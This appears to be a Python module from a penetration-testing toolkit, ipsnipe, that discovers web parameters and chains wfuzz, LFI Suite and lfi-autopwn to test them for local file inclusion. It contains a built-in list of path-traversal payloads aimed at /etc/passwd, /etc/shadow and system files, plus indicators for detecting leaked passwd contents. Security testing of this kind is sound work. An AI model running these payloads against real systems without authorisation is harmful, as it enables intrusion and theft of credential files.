#!/usr/bin/env python3
"""
Parameter Discovery and LFI Testing Scanner for ipsnipe
Combines arjun, paramspider, wfuzz, LFI Suite, and lfi-autopwn for comprehensive parameter and LFI testing
"""

import subprocess
import time
import os
from typing import Dict, List, Optional
from pathlib import Path
from ..ui.colors import Colors


class ParameterLFIScanner:
    """Advanced parameter discovery and LFI testing functionality"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.discovered_parameters = []
        self.lfi_vulnerabilities = []
        self.successful_payloads = []
    
    def should_run_param_scan(self, web_ports: List[int]) -> bool:
        """Determine if parameter scanning should run based on available web ports"""
        if not web_ports:
            print(f"{Colors.YELLOW}⏭️  Skipping Parameter Discovery & LFI Testing - No web services detected{Colors.END}")
            print(f"{Colors.CYAN}💡 This scan requires active web services to test{Colors.END}")
            return False
        
        print(f"{Colors.GREEN}🔍 Running Parameter Discovery & LFI Testing on web ports: {web_ports}{Colors.END}")
        return True
    
    def get_best_web_target(self, target_ip: str, web_ports: List[int]) -> Optional[str]:
        """Get the best web target for parameter testing"""
        # Prefer HTTP for parameter testing (easier to analyze)
        for port in [80, 8080, 8000]:
            if port in web_ports:
                return f"http://{target_ip}:{port}"
        
        # Fall back to HTTPS if needed
        for port in [443, 8443]:
            if port in web_ports:
                return f"https://{target_ip}:{port}"
        
        # Use the first available web port
        if web_ports:
            port = web_ports[0]
            protocol = 'https' if port in [443, 8443] else 'http'
            return f"{protocol}://{target_ip}:{port}"
        
        return None
    
    def run_arjun_scan(self, target_url: str, run_command_func) -> Dict:
        """Run Arjun parameter discovery"""
        print(f"{Colors.CYAN}🔍 Step 1: Running Arjun parameter discovery...{Colors.END}")
        
        arjun_config = self.config.get('arjun', {
            'threads': 25,
            'delay': 0,
            'timeout': 10,
            'wordlist': 'default'
        })
        
        command = [
            'arjun',
            '-u', target_url,
            '-t', str(arjun_config['threads']),
            '--delay', str(arjun_config['delay']),
            '--timeout', str(arjun_config['timeout']),
            '-o', 'arjun_params.txt',
            '--stable'  # More stable scanning
        ]
        
        result = run_command_func(command, 'arjun_results.txt', 'Arjun Parameter Discovery', 'arjun')
        
        # Parse Arjun results to extract parameters
        if result['status'] == 'success':
            self._parse_arjun_results(result['output_file'])
        
        return result
    
    def run_paramspider_scan(self, target_url: str, run_command_func) -> Dict:
        """Run ParamSpider to find parameters from archived URLs"""
        print(f"{Colors.CYAN}🕷️  Step 2: Running ParamSpider for archived parameter discovery...{Colors.END}")
        
        # Extract domain from URL for ParamSpider
        domain = target_url.split('://')[1].split('/')[0].split(':')[0]
        
        paramspider_config = self.config.get('paramspider', {
            'level': 'high',
            'quiet': True
        })
        
        command = [
            'paramspider',
            '-d', domain,
            '--level', paramspider_config['level'],
            '-o', 'paramspider_results.txt'
        ]
        
        if paramspider_config['quiet']:
            command.append('--quiet')
        
        result = run_command_func(command, 'paramspider_results.txt', 'ParamSpider Archived Parameter Discovery', 'paramspider')
        
        # Parse ParamSpider results
        if result['status'] == 'success':
            self._parse_paramspider_results(result['output_file'])
        
        return result
    
    def run_lfi_testing_suite(self, target_url: str, run_command_func) -> Dict:
        """Run comprehensive LFI testing using multiple tools"""
        if not self.discovered_parameters:
            print(f"{Colors.YELLOW}⚠️  No parameters discovered - skipping LFI testing{Colors.END}")
            return {'status': 'skipped', 'reason': 'No parameters found for LFI testing'}
        
        print(f"{Colors.CYAN}🎯 Step 3: Running comprehensive LFI testing suite...{Colors.END}")
        print(f"{Colors.CYAN}📋 Testing {len(self.discovered_parameters)} discovered parameters{Colors.END}")
        
        lfi_results = []
        
        # Run WFUZZ LFI testing
        wfuzz_result = self._run_wfuzz_lfi(target_url, run_command_func)
        lfi_results.append(wfuzz_result)
        
        # Run LFI Suite if available
        lfi_suite_result = self._run_lfi_suite(target_url, run_command_func)
        lfi_results.append(lfi_suite_result)
        
        # Run lfi-autopwn if available
        lfi_autopwn_result = self._run_lfi_autopwn(target_url, run_command_func)
        lfi_results.append(lfi_autopwn_result)
        
        # Combine results
        successful_tests = [r for r in lfi_results if r['status'] == 'success']
        
        if successful_tests:
            return {
                'status': 'success',
                'lfi_tools_run': len(lfi_results),
                'successful_tools': len(successful_tests),
                'vulnerabilities_found': len(self.lfi_vulnerabilities)
            }
        else:
            return {
                'status': 'completed',
                'lfi_tools_run': len(lfi_results),
                'vulnerabilities_found': 0,
                'message': 'LFI testing completed - no vulnerabilities detected'
            }
    
    def _run_wfuzz_lfi(self, target_url: str, run_command_func) -> Dict:
        """Run WFUZZ with LFI payloads"""
        print(f"{Colors.CYAN}   🚀 Running WFUZZ LFI payload testing...{Colors.END}")
        
        wfuzz_config = self.config.get('wfuzz', {
            'threads': 20,
            'timeout': 10,
            'payloads': '/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt'
        })
        
        # Create LFI payload wordlist if not exists
        lfi_payloads = self._get_lfi_payload_list()
        
        results = []
        for param in self.discovered_parameters[:5]:  # Test top 5 parameters
            test_url = f"{target_url}?{param}=FUZZ"
            
            command = [
                'wfuzz',
                '-c',  # Colorize output
                '-z', f'file,{lfi_payloads}',
                '--hc', '404',  # Hide 404 responses
                '--hl', '0',    # Hide empty responses
                '-t', str(wfuzz_config['threads']),
                '-s', str(wfuzz_config['timeout']),
                test_url
            ]
            
            result = run_command_func(command, f'wfuzz_lfi_{param}.txt', f'WFUZZ LFI Testing - {param}', 'wfuzz')
            results.append(result)
            
            # Parse results for successful LFI
            if result['status'] == 'success':
                self._parse_wfuzz_lfi_results(result['output_file'], param)
        
        return {'status': 'success', 'parameters_tested': len(results)}
    
    def _run_lfi_suite(self, target_url: str, run_command_func) -> Dict:
        """Run LFI Suite for automated LFI detection"""
        if not self._check_tool_available('lfisuite'):
            return {'status': 'skipped', 'reason': 'LFI Suite not available'}
        
        print(f"{Colors.CYAN}   🔧 Running LFI Suite automated testing...{Colors.END}")
        
        command = [
            'lfisuite',
            '--url', target_url,
            '--auto',
            '--output', 'lfisuite_results.txt'
        ]
        
        return run_command_func(command, 'lfisuite_results.txt', 'LFI Suite Automated Testing', 'lfisuite')
    
    def _run_lfi_autopwn(self, target_url: str, run_command_func) -> Dict:
        """Run lfi-autopwn for LFI exploitation"""
        if not self._check_tool_available('lfi-autopwn'):
            return {'status': 'skipped', 'reason': 'lfi-autopwn not available'}
        
        print(f"{Colors.CYAN}   ⚡ Running lfi-autopwn exploitation testing...{Colors.END}")
        
        command = [
            'lfi-autopwn',
            '-u', target_url,
            '-o', 'lfi_autopwn_results.txt'
        ]
        
        return run_command_func(command, 'lfi_autopwn_results.txt', 'LFI AutoPwn Exploitation Testing', 'lfi-autopwn')
    
    def _parse_arjun_results(self, output_file: str):
        """Parse Arjun results to extract discovered parameters"""
        try:
            with open(output_file, 'r') as f:
                content = f.read()
            
            # Look for parameter patterns in Arjun output
            import re
            param_patterns = [
                r'Valid parameter: (\w+)',
                r'Parameter found: (\w+)',
                r'\[FOUND\]\s+(\w+)',
                r'(\w+)\s+\[VALID\]'
            ]
            
            for pattern in param_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if match not in self.discovered_parameters:
                        self.discovered_parameters.append(match)
                        print(f"{Colors.GREEN}   ✅ Found parameter: {match}{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️  Could not parse Arjun results: {e}{Colors.END}")
    
    def _parse_paramspider_results(self, output_file: str):
        """Parse ParamSpider results to extract parameters"""
        try:
            with open(output_file, 'r') as f:
                content = f.read()
            
            # ParamSpider outputs URLs with parameters
            import re
            from urllib.parse import urlparse, parse_qs
            
            urls = re.findall(r'https?://[^\s]+', content)
            for url in urls:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params.keys():
                    if param not in self.discovered_parameters:
                        self.discovered_parameters.append(param)
                        print(f"{Colors.GREEN}   ✅ Found parameter: {param}{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️  Could not parse ParamSpider results: {e}{Colors.END}")
    
    def _parse_wfuzz_lfi_results(self, output_file: str, parameter: str):
        """Parse WFUZZ results to identify successful LFI payloads"""
        try:
            with open(output_file, 'r') as f:
                content = f.read()
            
            # Look for successful LFI indicators
            lfi_indicators = [
                'root:x:0:0:',  # /etc/passwd
                'daemon:x:1:1:',
                'bin:x:2:2:',
                'www-data:x:',
                '[boot loader]',  # Windows boot.ini
                'Windows Registry Editor',
                'HKEY_LOCAL_MACHINE'
            ]
            
            lines = content.split('\n')
            for line in lines:
                if any(indicator in line for indicator in lfi_indicators):
                    # Extract payload from WFUZZ output
                    if 'FUZZ' in line or parameter in line:
                        vulnerability = {
                            'parameter': parameter,
                            'payload': line.strip(),
                            'type': 'LFI',
                            'evidence': line.strip()
                        }
                        self.lfi_vulnerabilities.append(vulnerability)
                        print(f"{Colors.RED}🚨 LFI vulnerability found in parameter: {parameter}{Colors.END}")
                        break
        
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️  Could not parse WFUZZ LFI results: {e}{Colors.END}")
    
    def _get_lfi_payload_list(self) -> str:
        """Get or create LFI payload list"""
        # Check for existing LFI wordlists
        lfi_wordlists = [
            '/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt',
            '/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt',
            '/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt'
        ]
        
        for wordlist in lfi_wordlists:
            if Path(wordlist).exists():
                return wordlist
        
        # Create basic LFI payload list
        lfi_payloads = [
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '/etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/windows/system32/drivers/etc/hosts',
            '../../../etc/shadow',
            '/proc/version',
            '/proc/cmdline',
            '/etc/issue',
            '/etc/hostname',
            '/etc/hosts'
        ]
        
        payload_file = 'lfi_payloads.txt'
        with open(payload_file, 'w') as f:
            f.write('\n'.join(lfi_payloads))
        
        print(f"{Colors.YELLOW}⚠️  Created basic LFI payload list: {payload_file}{Colors.END}")
        return payload_file
    
    def _check_tool_available(self, tool: str) -> bool:
        """Check if a tool is available"""
        try:
            subprocess.run(['which', tool], capture_output=True, check=True)
            return True
        except subprocess.CalledProcessError:
            return False
    
    def comprehensive_param_lfi_scan(self, target_ip: str, web_ports: List[int], run_command_func) -> Dict:
        """Run comprehensive parameter discovery and LFI testing"""
        if not self.should_run_param_scan(web_ports):
            return {'status': 'skipped', 'reason': 'No web services detected'}
        
        target_url = self.get_best_web_target(target_ip, web_ports)
        if not target_url:
            return {'status': 'failed', 'reason': 'No suitable web target found'}
        
        print(f"{Colors.GREEN}🎯 Running Comprehensive Parameter Discovery & LFI Testing{Colors.END}")
        print(f"{Colors.CYAN}🌐 Target: {target_url}{Colors.END}")
        print(f"{Colors.CYAN}🔍 Phase 1: Parameter Discovery{Colors.END}")
        print(f"{Colors.CYAN}🎯 Phase 2: LFI Vulnerability Testing{Colors.END}")
        
        results = {
            'target_url': target_url,
            'phases': {}
        }
        
        # Phase 1: Parameter Discovery
        print(f"\n{Colors.BOLD}{Colors.BLUE}🔍 Phase 1: Parameter Discovery{Colors.END}")
        
        # Run Arjun
        arjun_result = self.run_arjun_scan(target_url, run_command_func)
        results['phases']['arjun'] = arjun_result
        
        # Run ParamSpider
        paramspider_result = self.run_paramspider_scan(target_url, run_command_func)
        results['phases']['paramspider'] = paramspider_result
        
        # Phase 2: LFI Testing
        print(f"\n{Colors.BOLD}{Colors.BLUE}🎯 Phase 2: LFI Vulnerability Testing{Colors.END}")
        
        lfi_result = self.run_lfi_testing_suite(target_url, run_command_func)
        results['phases']['lfi_testing'] = lfi_result
        
        # Generate summary report
        self._generate_combined_report(results)
        
        # Determine overall status
        if self.lfi_vulnerabilities:
            results['status'] = 'vulnerabilities_found'
            results['critical_findings'] = len(self.lfi_vulnerabilities)
        elif self.discovered_parameters:
            results['status'] = 'parameters_found'
            results['parameters_discovered'] = len(self.discovered_parameters)
        else:
            results['status'] = 'completed'
            results['message'] = 'Scan completed - no parameters or vulnerabilities found'
        
        return results
    
    def _generate_combined_report(self, results: Dict):
        """Generate a combined report for parameter discovery and LFI testing"""
        report_file = 'parameter_lfi_comprehensive_report.txt'
        
        with open(report_file, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("ipsnipe Comprehensive Parameter Discovery & LFI Testing Report\n")
            f.write("=" * 80 + "\n\n")
            
            f.write(f"Target URL: {results['target_url']}\n")
            f.write(f"Scan Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            # Parameter Discovery Summary
            f.write("📋 PARAMETER DISCOVERY SUMMARY\n")
            f.write("-" * 40 + "\n")
            f.write(f"Total Parameters Discovered: {len(self.discovered_parameters)}\n\n")
            
            if self.discovered_parameters:
                f.write("Discovered Parameters:\n")
                for param in self.discovered_parameters:
                    f.write(f"  • {param}\n")
                f.write("\n")
            
            # LFI Testing Summary
            f.write("🚨 LFI VULNERABILITY SUMMARY\n")
            f.write("-" * 40 + "\n")
            f.write(f"LFI Vulnerabilities Found: {len(self.lfi_vulnerabilities)}\n\n")
            
            if self.lfi_vulnerabilities:
                f.write("CRITICAL - LFI Vulnerabilities Detected:\n")
                for vuln in self.lfi_vulnerabilities:
                    f.write(f"  🚨 Parameter: {vuln['parameter']}\n")
                    f.write(f"     Type: {vuln['type']}\n")
                    f.write(f"     Evidence: {vuln['evidence'][:100]}...\n\n")
            
            # Tool Execution Summary
            f.write("🔧 TOOL EXECUTION SUMMARY\n")
            f.write("-" * 40 + "\n")
            for phase, result in results['phases'].items():
                status = result.get('status', 'unknown')
                f.write(f"  {phase.title()}: {status.upper()}\n")
            
            f.write("\n")
            f.write("=" * 80 + "\n")
            f.write("For detailed results, check individual tool output files.\n")
            f.write("=" * 80 + "\n")
        
        print(f"{Colors.GREEN}📄 Combined report generated: {report_file}{Colors.END}") 